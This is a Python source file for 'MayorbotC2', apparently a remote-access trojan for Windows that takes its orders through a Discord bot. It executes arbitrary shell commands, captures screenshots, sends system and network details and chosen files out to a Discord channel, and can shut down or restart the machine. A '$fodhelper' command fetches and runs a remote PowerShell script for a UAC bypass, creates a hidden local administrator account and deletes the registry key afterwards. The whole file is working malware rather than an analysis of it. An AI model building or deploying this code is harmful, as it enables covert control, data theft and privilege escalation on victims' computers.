#MayorbotC2

from asyncio import subprocess
import discord
import os
import subprocess
from subprocess import PIPE, run
import sys
import time
import pyautogui
import socket

client = discord.Client()


@client.event
async def on_ready():
    #print('We have logged in as {0.user}'.format(client))
    channel = client.get_channel(chan_ID_here)
    #embedVar = discord.Embed(description="Checking in to work.")    
    #await channel.send(embed=embedVar)
    host_name = discord.Embed(description=socket.gethostname() + " checking in.")
    await channel.send(embed=host_name)


@client.event
async def on_message(message):
    try:
        if message.author == client.user:
            return
        if "Administrator" in [role.name for role in message.author.roles]:     
            if message.content.startswith('$custom_command'):
                args = message.content.split()
                if len(args) == 1:
                    embed=discord.Embed(title="Error", description="Please enter a command to run.", color=0xFF0000)
                    await message.channel.send(embed=embed)
                else:
                    command = args[1:]
                    command = ' '.join(command)
                    #print(command)
                    output = subprocess.check_output(command, shell=True)
                    await message.channel.send(f'```{output.strip().decode("utf-8")}```')
            if message.content.startswith('$cd'):
                args = message.content.split()
                if len(args) == 1:
                    embed=discord.Embed(title="Error", description="Please enter a directory.", color=0xFF0000)
                    await message.channel.send(embed=embed)
                else:
                    directory = args[1:]
                    directory = ' '.join(directory)
                    print(directory)
                    os.chdir(directory)
                    embed=discord.Embed(title="Directory changed to:", description=directory,  color=0x00FF00)
                    await message.channel.send(embed=embed)
            if message.content.startswith('$screenshot'):
                sct_shot = pyautogui.screenshot()
                sct_shot.save('C:\\Users\\Public\\puppies.png')
                with open(r'C:\\Users\\Public\\puppies.png', 'rb') as f:
                    await message.channel.send(file=discord.File(f))
                os.remove(r'C:\\Users\\Public\\puppies.png')
            if message.content.startswith('$ip'):
                ip = subprocess.check_output('ipconfig')
                if len(ip) >= 2000:
                    with open("C:\\Users\\Public\\ip.txt", "wt") as f:
                        f.write(str(ip.strip().decode('utf-8')))
                    f.close()
                    await message.channel.send(file=discord.File('C:\\Users\\Public\\ip.txt'))
                    os.remove("C:\\Users\\Public\\ip.txt")
            if message.content.startswith('$sysinfo'):         
                sys_info = subprocess.check_output('systeminfo')
                if len(sys_info) >= 2000:
                    with open("C:\\Users\\Public\\sysinfo.txt", "wt") as f:
                        f.write(str(sys_info.strip().decode('utf-8')))
                    f.close()
                    await message.channel.send(file=discord.File('C:\\Users\\Public\\sysinfo.txt'))  
                    os.remove("C:\\Users\\Public\\sysinfo.txt")        
                else:
                    await message.channel.send(sys_info)
            if message.content.startswith('$filegrab'):
                args = message.content.split()
                if len(args) == 1:
                    await message.channel.send("Please enter a file.")
                else:
                    file = args[1:]
                    file = ' '.join(file)
                    print(file)
                    with open(file, 'rb') as f:
                        await message.channel.send(file=discord.File(f))
            if message.content.startswith('$fodhelper'):
                command = "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.1.x:8180/helper.ps1');helper -custom 'cmd.exe /c net user test123 Password123 /add & net localgroup administrators test123 /add'"
                output = subprocess.check_output(command, universal_newlines=True)
                await message.channel.send(output)
                time.sleep(10)
                command = 'reg delete HKEY_CURRENT_USER\SOFTWARE\Classes\ms-settings\Shell /f'
                output = subprocess.check_output(command, universal_newlines=True)
                await message.channel.send(output)

            if message.content.startswith('$shutdown'):
                command = 'shutdown -s -t 0'
                output = subprocess.check_output(command, universal_newlines=True)
                await message.channel.send(output)
            if message.content.startswith('$restart'):
                command = 'shutdown -r -t 0'
                output = subprocess.check_output(command, universal_newlines=True)
                await message.channel.send(output)
            if message.content.startswith('$exit'):
                sys.exit()
    except AttributeError:
        pass
    except KeyboardInterrupt:
        sys.exit()


client.run('Insert Discord Bot Token Here')
